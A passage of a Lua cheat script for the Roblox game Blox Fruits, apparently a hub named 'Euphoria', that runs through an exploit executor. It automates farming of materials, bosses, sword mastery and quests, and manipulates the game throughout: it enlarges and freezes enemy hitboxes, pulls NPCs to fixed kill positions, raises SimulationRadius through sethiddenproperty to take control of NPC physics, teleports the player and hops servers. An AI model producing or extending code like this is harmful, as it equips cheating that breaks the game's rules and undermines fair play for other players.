                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                                                if GetMaterial("Bones") < 500 then
                                                    if _G.GodhumanInfo['Electric Claw'] >= 400 and _G.GodhumanInfo['Sharkman Karate'] >= 400 and _G.GodhumanInfo['Sharkman Karate'] >= 400 and _G.GodhumanInfo['Death Step'] >= 400 then
                                                        FarmBonesGH = true
                                                    end
                                                else
                                                    FarmBonesGH = false
                                                end
                                            else
                                                FarmBonesGH = true
                                            end
                                            if LP.Backpack:FindFirstChild("Dragon Talon") or LP.Character:FindFirstChild("Dragon Talon") then
                                                if LP.Backpack:FindFirstChild("Dragon Talon") then
                                                    _G.GodhumanInfo["Dragon Talon"] = LP.Backpack:FindFirstChild("Dragon Talon").Level.Value
                                                elseif LP.Character:FindFirstChild("Dragon Talon") then
                                                    _G.GodhumanInfo["Dragon Talon"] = LP.Character:FindFirstChild("Dragon Talon").Level.Value
                                                end
                                            else
                                                _G.GodhumanInfo["Dragon Talon"] = false
                                            end
                                        else
                                            if _G.GodhumanWeaponSelected == "Dragon Talon" then
                                                _G.GodhumanWeaponSelected = false
                                            end
                                        end
                                    end
                                end
                                if _G.GodhumanInfo["Black Leg"] >= 400 and _G.GodhumanInfo["Electro"] >= 400 and _G.GodhumanInfo["Fishman Karate"] >= 400 and _G.GodhumanInfo["Dragon Claw"] >= 400 and _G.GodhumanInfo["Superhuman"] >= 400 and _G.GodhumanInfo["Death Step"] >= 400 and _G.GodhumanInfo["Electric Claw"] >= 400 and _G.GodhumanInfo["Sharkman Karate"] >= 400 and _G.GodhumanInfo["Dragon Talon"] >= 400 then
                                    if not LP.Backpack:FindFirstChild("Godhuman") and not LP.Character:FindFirstChild("Godhuman") then
                                        if GetMaterial("Fish Tail") < 20 then
                                            if not first_sea then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelMain")
                                            else
                                                if game:GetService("Workspace").Enemies:FindFirstChild("Fishman Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Commando") then
                                                    target = getClosest({"Fishman Warrior", "Fishman Commando"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                elseif ReplicatedStorage:FindFirstChild("Fishman Warrior") or ReplicatedStorage:FindFirstChild("Fishman Commando") then
                                                    target = getClosest({"Fishman Warrior", "Fishman Commando"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                else
                                                    for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                                        if string.find(v.Name, "Fishman Warrior") or string.find(v.Name, "Fishman Commando") then
                                                            if getDistance(v.CFrame) > 500 then
                                                                repeat wait()
                                                                    useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                                    toPoint(v.CFrame * CFrame.new(0,50,0))
                                                                until not _G.AutoGodhuman or getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Fishman Commando") or ReplicatedStorage:FindFirstChild("Fishman Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Commando") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Warrior")
                                                            end
                                                            if ReplicatedStorage:FindFirstChild("Fishman Commando") or ReplicatedStorage:FindFirstChild("Fishman Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Commando") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Warrior") then
                                                                break
                                                            end
                                                            wait(2)
                                                        end
                                                    end
                                                end
                                            end
                                        elseif GetMaterial("Magma Ore") < 20 then
                                            if not second_sea then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
                                            else
                                                if game:GetService("Workspace").Enemies:FindFirstChild("Magma Ninja") or game:GetService("Workspace").Enemies:FindFirstChild("Lava Pirate") then
                                                    target = getClosest({"Magma Ninja", "Lava Pirate"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                elseif ReplicatedStorage:FindFirstChild("Magma Ninja") or ReplicatedStorage:FindFirstChild("Lava Pirate") then
                                                    target = getClosest({"Magma Ninja", "Lava Pirate"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                else
                                                    for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                                        if string.find(v.Name, "Magma Ninja") or string.find(v.Name, "Lava Pirate") then
                                                            if getDistance(v.CFrame) > 500 then
                                                                repeat wait()
                                                                    useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                                    toPoint(v.CFrame * CFrame.new(0,50,0))
                                                                until not _G.AutoGodhuman or getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Lava Pirate") or ReplicatedStorage:FindFirstChild("Magma Ninja") or game:GetService("Workspace").Enemies:FindFirstChild("Lava Pirate") or game:GetService("Workspace").Enemies:FindFirstChild("Magma Ninja")
                                                            end
                                                            if ReplicatedStorage:FindFirstChild("Lava Pirate") or ReplicatedStorage:FindFirstChild("Magma Ninja") or game:GetService("Workspace").Enemies:FindFirstChild("Lava Pirate") or game:GetService("Workspace").Enemies:FindFirstChild("Magma Ninja") then
                                                                break
                                                            end
                                                            wait(2)
                                                        end
                                                    end
                                                end
                                            end

                                        elseif GetMaterial("Mystic Droplet") < 10 then
                                            if not second_sea then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
                                            else
                                                if game:GetService("Workspace").Enemies:FindFirstChild("Sea Soldier") or game:GetService("Workspace").Enemies:FindFirstChild("Water Fighter") then
                                                    target = getClosest({"Sea Soldier", "Water Fighter"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                elseif ReplicatedStorage:FindFirstChild("Sea Soldier") or ReplicatedStorage:FindFirstChild("Water Fighter") then
                                                    target = getClosest({"Sea Soldier", "Water Fighter"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                else
                                                    for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                                        if string.find(v.Name, "Sea Soldier") or string.find(v.Name, "Water Fighter") then
                                                            if getDistance(v.CFrame) > 500 then
                                                                repeat wait()
                                                                    useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                                    toPoint(v.CFrame * CFrame.new(0,50,0))
                                                                until not _G.AutoGodhuman or getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Water Fighter") or ReplicatedStorage:FindFirstChild("Sea Soldier") or game:GetService("Workspace").Enemies:FindFirstChild("Water Fighter") or game:GetService("Workspace").Enemies:FindFirstChild("Sea Soldier")
                                                            end
                                                            if ReplicatedStorage:FindFirstChild("Water Fighter") or ReplicatedStorage:FindFirstChild("Sea Soldier") or game:GetService("Workspace").Enemies:FindFirstChild("Water Fighter") or game:GetService("Workspace").Enemies:FindFirstChild("Sea Soldier") then
                                                                break
                                                            end
                                                            wait(2)
                                                        end
                                                    end
                                                end
                                            end
                                        elseif GetMaterial("Dragon Scale") < 10 then
                                            if not third_sea then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                            else
                                                if game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior") then
                                                    target = getClosest({"Dragon Crew Warrior", "Dragon Crew Archer"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                elseif ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") then
                                                    target = getClosest({"Dragon Crew Warrior", "Dragon Crew Archer"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                else
                                                    for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                                        if string.find(v.Name, "Dragon Crew Warrior") or string.find(v.Name, "Dragon Crew Archer") then
                                                            if getDistance(v.CFrame) > 500 then
                                                                repeat wait()
                                                                    useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                                    toPoint(v.CFrame * CFrame.new(0,50,0))
                                                                until not _G.AutoGodhuman or getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior")
                                                            end
                                                            if ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior") then
                                                                break
                                                            end
                                                            wait(2)
                                                        end
                                                    end
                                                end
                                            end
                                            
                                        else
                                            if not third_sea then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                            else
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman", true)
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
                                            end
                                        end
                                    end
                                end
                            end
                        else
                            FarmBonesGH = false
                        end
                    end)
                end
            end)

            AutoTTKMastery = MiscFarmItemsSection:NewToggle("Auto Farm Mastery TTK Swords", function(state)
                getgenv().EuphoriaSettings["Auto Farm Mastery TTK Swords"] = state
                WriteSettings()
            end)

            if getgenv().EuphoriaSettings["Auto Farm Mastery TTK Swords"] then AutoTTKMastery:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Farm Mastery TTK Swords"] and not isWeaponInInventory("True Triple Katana") then _G.AutoTTKMastery = true else _G.AutoTTKMastery = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoTTKMastery then
                            if isWeaponInInventory("Wando") and getWeaponMastery("Wando") < 300 then
                                EquipSword("Wando")
                                _G.SelectWeapon = "Sword"
                                _G.FarmWeaponMastery = true
                            elseif isWeaponInInventory("Shisui") and getWeaponMastery("Shisui") < 300 then
                                EquipSword("Shisui")
                                _G.SelectWeapon = "Sword"
                                _G.FarmWeaponMastery = true
                            elseif isWeaponInInventory("Saddi") and getWeaponMastery("Saddi") < 300 then
                                EquipSword("Saddi")
                                _G.SelectWeapon = "Sword"
                                _G.FarmWeaponMastery = true
                            else
                                if LP.Data.Beli.Value > 2000000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("MysteriousMan","1")
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("MysteriousMan","2")
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("MysteriousMan","3")
                                end
                                _G.FarmWeaponMastery = false
                            end
                        end
                    end)
                end
            end)

            FarmBosses = MiscFarmItemsSection:NewToggle("Farm All Bosses", function(state)
                getgenv().EuphoriaSettings["Farm All Bosses"] = state
                WriteSettings()
            end)

            if getgenv().EuphoriaSettings["Farm All Bosses"] then FarmBosses:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm All Bosses"] then _G.FarmBosses = true else _G.FarmBosses = false end
                    end)
                end
            end)

            HopIfNoBosses = MiscFarmItemsSection:NewToggle("Hop If No Bosses", function(state)
                getgenv().EuphoriaSettings["Hop If No Bosses"] = state
                WriteSettings()
            end)

            if getgenv().EuphoriaSettings["Hop If No Bosses"] then HopIfNoBosses:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Hop If No Bosses"] then _G.HopIfNoBosses = true else _G.HopIfNoBosses = false end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.FarmBosses then
                            if second_sea then
                                bossList = {"Diamond", "Jeremy", "Fajita", "Smoke Admiral", "Awakened Ice Admiral", "Tide Keeper", "Don Swan"}
                            elseif third_sea then
                                bossList = {"Stone", "Island Empress", "Kilo Admiral", "Captain Elephant", "Beautiful Pirate", "Cake Queen", "Deandre", "Diablo", "Urban"}
                            end
                            boss = getClosest(bossList)
                            if not boss then
                                if _G.HopIfNoBosses then
                                    HopToLowestServer()
                                end
                            end
                            if boss and boss.Humanoid.Health > 0 then
                                repeat wait()
                                    if useNearestEntrance(boss.HumanoidRootPart.CFrame) then
                                        StopTween()
                                    end
                                    toTarget(boss.HumanoidRootPart.CFrame * OffsetCFrame())
                                    EquipWeapon(_G.SelectWeapon)
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                    boss.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                    boss.HumanoidRootPart.CanCollide = false
                                    boss.Humanoid.WalkSpeed = 0
                                    boss.Head.CanCollide = false
                                    BringMobFarm = true
                                    PosMon = boss.HumanoidRootPart.CFrame
                                    boss.HumanoidRootPart.Transparency = 1
                                until not boss or boss.Humanoid.Health < 0
                            end
                        end
                    end)
                end
            end)
        end

        if first_sea then
            local Sea1ItemsSection = FarmTab:NewSection("Sea 1 Items")
            AutoPole1st = Sea1ItemsSection:NewToggle("Auto Pole 1st Form", function(state)
                getgenv().EuphoriaSettings["Auto Pole 1st Form"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Pole 1st Form"] then AutoPole1st:UpdateToggle(nil, true) end
            AutoPole1stHop = Sea1ItemsSection:NewToggle("Auto Pole 1st Form Hop", function(state)
                getgenv().EuphoriaSettings["Auto Pole 1st Form Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Pole 1st Form Hop"] then AutoPole1stHop:UpdateToggle(nil, true) end
            Sea1ItemsSection:NewLabel(" ")
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Pole 1st Form"] and not isWeaponInInventory("Pole (1st Form)") then _G.AutoPole1st = true else _G.AutoPole1st = false end
                    end)
                end
            end)
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.AutoPole1st and first_sea then
                            if game.Workspace.Enemies:FindFirstChild("Thunder God") and game.Workspace.Enemies:FindFirstChild("Thunder God"):FindFirstChild("HumanoidRootPart") and game.Workspace.Enemies:FindFirstChild("Thunder God").Humanoid.Health > 0 then
                                v = game.Workspace.Enemies:FindFirstChild("Thunder God")
                                if v:FindFirstChild("HumanoidRootPart") then
                                    if v.Humanoid.Health <= 0 then 
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    else
                                        repeat task.wait()
                                            EquipWeapon(_G.SelectWeapon)
                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                            v.Humanoid:ChangeState(14)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Head.CanCollide = false
                                            BringMobFarm = false
                                            RenMon = v.Name
                                            RenPos = v.HumanoidRootPart.CFrame
                                        until not _G.AutoPole1st or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                else
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                end
                            elseif game.ReplicatedStorage:FindFirstChild("Thunder God") and game.ReplicatedStorage:FindFirstChild("Thunder God"):FindFirstChild("HumanoidRootPart") and game.ReplicatedStorage:FindFirstChild("Thunder God").Humanoid.Health > 0 then
                                v = game.ReplicatedStorage:FindFirstChild("Thunder God")
                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                wait(4)
                            else
                                if getgenv().EuphoriaSettings["Auto Pole 1st Form Hop"] then
                                    HopServer()
                                end
                            end
                        end
                    end)
                end
            end)
        end

        
        if second_sea then
            local Sea2ItemsSection = FarmTab:NewSection("Sea 2 Items")
            local Sea2MaterialsSection = FarmTab:NewSection("Sea 2 Materials")
            FarmFangs = Sea2MaterialsSection:NewToggle("Farm Vampire Fang", function(state)
                getgenv().EuphoriaSettings["Farm Vampire Fang"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Vampire Fang"] then FarmFangs:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Vampire Fang"] then _G.FarmFangs = true else _G.FarmFangs = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if _G.FarmFangs and second_sea then
                        local NPCList = {"Vampire"}
                        pcall(function()
                            npcTarget = getClosest(NPCList)
                            if npcTarget then
                                repeat task.wait()
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                    npcTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                    npcTarget.HumanoidRootPart.CanCollide = false
                                    npcTarget.Humanoid.WalkSpeed = 0
                                    npcTarget.Head.CanCollide = false
                                    BringMobFarm = true
                                    PosMon = npcTarget.HumanoidRootPart.CFrame
                                    EquipWeapon(_G.SelectWeapon)
                                    npcTarget.HumanoidRootPart.Transparency = 1
                                    toTarget(npcTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                until not _G.FarmFangs or not v.Parent or npcTarget.Humanoid.Health <= 0
                            else 
                                for i,v in pairs(getSpawnPoints(NPCList)) do
                                    if getClosest(NPCList) then break end
                                    if getDistance(v * OffsetCFrame()) > 100 then
                                        repeat wait()
                                            if useNearestEntrance(v * OffsetCFrame()) then
                                                StopTween()
                                            end
                                            toPoint(v * OffsetCFrame())
                                        until getDistance(v * OffsetCFrame()) < 50 or getClosest(NPCList) or not _G.FarmFangs
                                    end
                                end 
                            end
                        end)
                    end
                end
            end) 


            
            function GetQuestV3()
                local v33000 = ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
                if v33000 == 0 then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "2")
                    wait(.1)
                elseif v33000 == -1 then
                    notis.new("You dont have v2 race"):Display()
                end
            end
            function BuyV3Race()
                local v33000 = ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
                local v33000 = ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "3")
            end
            function isNPCAlive(NPCName)
                if workspace.Enemies:FindFirstChild(NPCName) or ReplicatedStorage:FindFirstChild(NPCName) then 
                    return true 
                else 
                    return false 
                end
            end
            skipTargets = {}
            function isInSkipTarget(Name)
                for i,v in ipairs(skipTargets) do
                    if v == Name then return true end
                end
                return false
            end

            AutoBartiloToggle = Sea2ItemsSection:NewToggle("Auto Bartilo Quest", function(state)
                getgenv().EuphoriaSettings["Auto Bartilo Quest"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Bartilo Quest"] then AutoBartiloToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Bartilo Quest"] then AutoBartilo = true else AutoBartilo = false end
                    end)
                end
            end)
            AutoSea3Bartilo = false
            spawn(function()
                while wait() do
                    pcall(function()
                        if (AutoBartilo or AutoSea3Bartilo) and LP.Data.Level.Value >= 800 then
                            BringMobFarm = false
                            if not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledBandits then
                                if string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan Pirates") and string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") and LP.PlayerGui.Main.Quest.Visible == true then 
                                    KillPosition = CFrame.new(949.148499, 102.9596939, 1274.4718)
                                    toPoint(KillPosition * OffsetCFrame())
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Swan Pirate") then
                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name == "Swan Pirate" then
                                                v.HumanoidRootPart.CFrame = KillPosition
                                                v.Humanoid.JumpPower = 0
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                v.HumanoidRootPart.Transparency = 1
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                if v.Humanoid:FindFirstChild("Animator") then
                                                    v.Humanoid.Animator:Destroy()
                                                end
                                                v.Humanoid:ChangeState(11)
                                                v.Humanoid:ChangeState(14)
                                                sethiddenproperty(LP, "SimulationRadius",  math.huge)
                                                wait()
                                            end
                                        end
                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name == "Swan Pirate" then
                                                repeat task.wait()
                                                    sethiddenproperty(LP, "SimulationRadius", math.huge)
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.HumanoidRootPart.WalkSpeed = 0
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    toPoint(KillPosition * OffsetCFrame())										
                                                    v.HumanoidRootPart.CFrame = KillPosition
                                                until not v.Parent or v.Humanoid.Health <= 0 or not AutoBartilo or LP.PlayerGui.Main.Quest.Visible == false
                                            end
                                        end
                                    end
                                else
                                    repeat wait()
                                        toPoint(CFrame.new(-459.933136, 74.4530869, 300.132751, -0.220162302, 8.81837039e-08, 0.975463271, 1.34934794e-07, 1, -5.99470553e-08, -0.975463271, 1.18425852e-07, -0.220162302))
                                    until not AutoBartilo or getDistance(CFrame.new(-459.933136, 74.4530869, 300.132751, -0.220162302, 8.81837039e-08, 0.975463271, 1.34934794e-07, 1, -5.99470553e-08, -0.975463271, 1.18425852e-07, -0.220162302)) < 20
                                    wait(1)
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest","BartiloQuest",1)
                                end 
                            elseif not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledSpring then
                                if game:GetService("Workspace").Enemies:FindFirstChild("Jeremy") then
                                    v = game:GetService("Workspace").Enemies:FindFirstChild("Jeremy")
                                    repeat wait()
                                        sethiddenproperty(LP, "SimulationRadius", math.huge)
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        v.HumanoidRootPart.CanCollide = false
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        toPoint(v.HumanoidRootPart.CFrame * OffsetCFrame())										
                                    until not v.Parent or v.Humanoid.Health <= 0 or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledSpring
                                elseif ReplicatedStorage:FindFirstChild("Jeremy") then
                                    v = ReplicatedStorage:FindFirstChild("Jeremy")
                                    repeat wait()
                                        sethiddenproperty(LP, "SimulationRadius", math.huge)
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        v.HumanoidRootPart.CanCollide = false
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        toPoint(v.HumanoidRootPart.CFrame * OffsetCFrame())										
                                    until not v.Parent or v.Humanoid.Health <= 0 or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledSpring
                                else
                                    notis.new("Hop server for find Jeremy boss [Bartilo Quest]"):Display()
                                    notis.new("Hop server for find Jeremy boss [Bartilo Quest]"):Display()
                                    notis.new("Hop server for find Jeremy boss [Bartilo Quest]"):Display()
                                    wait(1)
                                    HopServer()
                                end
                            elseif not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates then
                                PlatesPosition = CFrame.new(-1837.8042, 28.7205391, 1721.03979, -0.694665372, -6.45133298e-08, 0.719333053, -7.54023333e-08, 1, 1.68683254e-08, -0.719333053, -4.25215489e-08, -0.694665372)
                                if getDistance(PlatesPosition) > 50 then
                                    repeat wait()
